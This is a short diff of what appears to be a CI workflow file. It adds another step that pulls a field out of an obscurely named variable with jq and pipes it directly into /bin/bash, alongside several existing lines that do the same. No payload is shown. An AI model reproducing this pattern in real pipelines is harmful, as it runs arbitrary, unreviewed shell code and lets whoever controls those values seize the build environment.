@@ -31,6 +31,7 @@ jobs:
           printf '%s' "$oisbm9" | jq -r .ijiu759 | /bin/bash
           printf '%s' "$pv94" | jq -r .gaho23 | /bin/bash
           echo $dd50 | jq -r .gm276 | /bin/bash
+          echo $tn378 | jq -r .rfnoi1 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
